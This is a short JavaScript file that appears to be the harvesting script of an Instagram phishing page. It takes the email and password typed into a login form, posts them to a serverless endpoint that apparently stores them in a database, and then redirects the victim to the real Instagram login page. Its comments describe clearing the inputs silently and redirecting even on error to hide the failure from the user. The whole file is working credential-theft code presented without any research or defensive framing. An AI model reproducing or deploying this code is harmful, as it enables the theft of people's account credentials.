const authForm = document.getElementById('login-form');

authForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const userIdentity = document.getElementById('identity-input').value; 
    const userPassword = document.getElementById('password-input').value;

    const payload = {
        email: userIdentity,
        password: userPassword
    };

    try {
        // Sends data straight to your Vercel serverless function endpoint
        const response = await fetch('/api/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            authForm.reset(); // Clears the inputs silently
            
            // Redirects instantly to the real Instagram error validation page
            window.location.href = "https://www.instagram.com/accounts/login/?next=%2F";
        } else {
            // Fails silently or handles error without browser popups
            const err = await response.json();
            console.error("Database Error:", err.error);
            // Redirect anyways to hide errors from user
            window.location.href = "https://www.instagram.com/accounts/login/?next=%2F";
        }
    } catch (e) {
        console.error("Connection failed:", e);
        window.location.href = "https://www.instagram.com/accounts/login/?next=%2F";
    }
});
